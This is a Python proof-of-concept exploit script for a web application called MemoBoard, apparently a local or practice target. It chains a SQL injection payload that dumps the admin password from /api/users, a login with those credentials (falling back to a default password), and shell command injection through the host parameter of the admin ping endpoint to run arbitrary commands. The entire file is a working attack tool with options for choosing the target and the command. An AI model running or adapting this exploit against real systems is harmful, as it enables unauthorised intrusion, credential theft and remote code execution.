#!/usr/bin/env python3
"""PoC: MemoBoard admin ping command injection (RCE)

Chains: SQLi dump admin password → login as admin → ping RCE.
Also works standalone with known seed credentials admin/admin123.
"""
import argparse
import json
import os
import urllib.request
import urllib.parse
import http.cookiejar


def never_bypass(host, **kwargs):
    return False


def opener(proxy: str):
    cj = http.cookiejar.CookieJar()
    if not proxy:
        return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    os.environ["no_proxy"] = ""
    os.environ["NO_PROXY"] = ""
    urllib.request.proxy_bypass = never_bypass
    if hasattr(urllib.request, "proxy_bypass_environment"):
        urllib.request.proxy_bypass_environment = never_bypass
    if hasattr(urllib.request, "proxy_bypass_registry"):
        urllib.request.proxy_bypass_registry = never_bypass
    handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
    return urllib.request.build_opener(handler, urllib.request.HTTPCookieProcessor(cj))


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard RCE PoC (admin ping command injection)")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument("-c", "--cmd", default="id", help="Command to execute (RCE)")
    p.add_argument("-U", "--user", default="admin", help="Admin username (default: admin)")
    p.add_argument("-P", "--password", default="", help="Admin password; if empty, dumps via SQLi first")
    args = p.parse_args()

    base = args.url.rstrip("/")
    http = opener(args.proxy)

    password = args.password

    # Step 1: If no password provided, dump admin password via SQLi
    if not password:
        print("[*] No password provided — dumping admin credentials via SQLi...")
        sqli_params = urllib.parse.urlencode({"name": "' OR 1=1 --"})
        sqli_url = f"{base}/api/users?{sqli_params}"
        req = urllib.request.Request(sqli_url, headers={"Accept": "application/json"})
        try:
            resp = http.open(req, timeout=15)
            body = resp.read().decode("utf-8", errors="replace")
        except Exception as e:
            print(f"[!] SQLi request failed: {e}")
            return 1
        try:
            data = json.loads(body)
            users = data.get("users", [])
            admin_user = next((u for u in users if u.get("role") == "admin"), None)
            if admin_user:
                password = admin_user.get("password", "")
                print(f"[+] Admin password dumped via SQLi: {password}")
            else:
                print("[-] Admin not found in SQLi results. Trying default admin/admin123.")
                password = "admin123"
        except json.JSONDecodeError:
            print("[-] SQLi response not JSON. Trying default admin/admin123.")
            password = "admin123"

    # Step 2: Login as admin
    print(f"[*] Logging in as {args.user}...")
    login_data = json.dumps({"username": args.user, "password": password}).encode("utf-8")
    login_req = urllib.request.Request(
        f"{base}/api/login",
        data=login_data,
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        resp = http.open(login_req, timeout=15)
        login_body = resp.read().decode("utf-8", errors="replace")
        print(f"[*] Login response: {resp.status} {login_body}")
        if resp.status != 200:
            print("[-] Login failed.")
            return 1
    except urllib.error.HTTPError as e:
        print(f"[-] Login failed: HTTP {e.code}")
        return 1

    # Step 3: Command injection via ping
    # payload: ;<cmd>  — the shell runs: echo MEMO-PING ;<cmd>
    payload = f";{args.cmd}"
    ping_params = urllib.parse.urlencode({"host": payload})
    ping_url = f"{base}/api/tools/ping?{ping_params}"
    print(f"[*] Sending RCE payload: GET {ping_url}")
    ping_req = urllib.request.Request(ping_url, headers={"Accept": "text/plain"})
    try:
        resp = http.open(ping_req, timeout=15)
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(f"[!] RCE request failed: {e}")
        return 1

    print(f"[*] HTTP Status: {status}")
    print(f"[*] Response Body:")
    print(body)

    # The response will contain "MEMO-PING " on first line, then command output on subsequent lines
    lines = body.strip().split("\n")
    if len(lines) > 1 or (args.cmd and args.cmd.split()[0] in body):
        cmd_output = "\n".join(lines[1:]) if len(lines) > 1 else body
        print(f"\n命令输出:")
        print(cmd_output)
        print("\n[+] SUCCESS: Command executed via ping command injection (RCE).")
        return 0
    else:
        print("\n[-] Could not confirm command output in response.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
